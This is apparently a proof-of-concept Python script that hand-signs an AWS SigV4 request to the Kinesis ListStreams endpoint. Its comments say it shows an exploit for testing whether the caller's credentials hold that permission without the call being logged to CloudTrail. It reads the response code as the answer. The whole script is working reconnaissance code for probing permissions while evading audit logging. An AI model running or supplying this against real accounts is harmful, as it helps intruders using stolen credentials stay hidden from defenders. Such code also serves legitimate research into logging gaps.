#!/usr/bin/env python3

# Template copied from URL below
# See: http://docs.aws.amazon.com/general/latest/gr/sigv4_signing.html
import sys, os, base64, datetime, hashlib, hmac
import requests # pip install requests
import boto3

## This is a one off script showing how the general exploit is pulled off.
## Here we are determining if we have permission to call kinesis:ListStreams
## without logging to cloudtrail

method = 'POST'
service = 'kinesis'
host = 'kinesis.us-east-1.amazonaws.com'
region = 'us-east-1'
endpoint = 'https://kinesis.us-east-1.amazonaws.com/'
content_type = 'application/x-amz-json-1.0'
amz_target = 'Kinesis_20131202.ListStreams'

request_parameters ="{}"

def sign(key, msg):
    return hmac.new(key, msg.encode("utf-8"), hashlib.sha256).digest()

def getSignatureKey(key, date_stamp, regionName, serviceName):
    kDate = sign(('AWS4' + key).encode('utf-8'), date_stamp)
    kRegion = sign(kDate, regionName)
    kService = sign(kRegion, serviceName)
    kSigning = sign(kService, 'aws4_request')
    return kSigning

access_key = os.environ.get('AWS_ACCESS_KEY_ID')
secret_key = os.environ.get('AWS_SECRET_ACCESS_KEY')
session_token = os.environ.get('AWS_SESSION_TOKEN')
if access_key is None or secret_key is None:
    print('No access key is available.')
    sys.exit()

t = datetime.datetime.utcnow()
amz_date = t.strftime('%Y%m%dT%H%M%SZ')
date_stamp = t.strftime('%Y%m%d')


canonical_uri = '/'

canonical_querystring = ''

canonical_headers = 'content-type:' + content_type + '\n' + 'host:' + host + '\n' + 'x-amz-date:' + amz_date + '\n' + 'x-amz-target:' + amz_target + '\n'

signed_headers = 'content-type;host;x-amz-date;x-amz-target'

payload_hash = hashlib.sha256(request_parameters.encode('utf-8')).hexdigest()

canonical_request = method + '\n' + canonical_uri + '\n' + canonical_querystring + '\n' + canonical_headers + '\n' + signed_headers + '\n' + payload_hash


algorithm = 'AWS4-HMAC-SHA256'
credential_scope = date_stamp + '/' + region + '/' + service + '/' + 'aws4_request'
string_to_sign = algorithm + '\n' +  amz_date + '\n' +  credential_scope + '\n' +  hashlib.sha256(canonical_request.encode('utf-8')).hexdigest()

signing_key = getSignatureKey(secret_key, date_stamp, region, service)

signature = hmac.new(signing_key, (string_to_sign).encode('utf-8'), hashlib.sha256).hexdigest()


authorization_header = algorithm + ' ' + 'Credential=' + access_key + '/' + credential_scope + ', ' +  'SignedHeaders=' + signed_headers + ', ' + 'Signature=' + signature

headers = {'Content-Type':content_type,
           'X-Amz-Date':amz_date,
           'X-Amz-Target':amz_target,
           'X-Amz-Security-Token':session_token,
           'Authorization':authorization_header}


print('\nBEGIN REQUEST++++++++++++++++++++++++++++++++++++')
print('Request URL = ' + endpoint)

r = requests.post(endpoint, data=request_parameters, headers=headers)

print('\nRESPONSE++++++++++++++++++++++++++++++++++++')
print('Response code: %d\n' % r.status_code)
print(r.text)

if r.status_code == 403:
    print("You do not have permissions to list-streams")
elif r.status_code == 404:
    print("You have permissions to list-streams!")
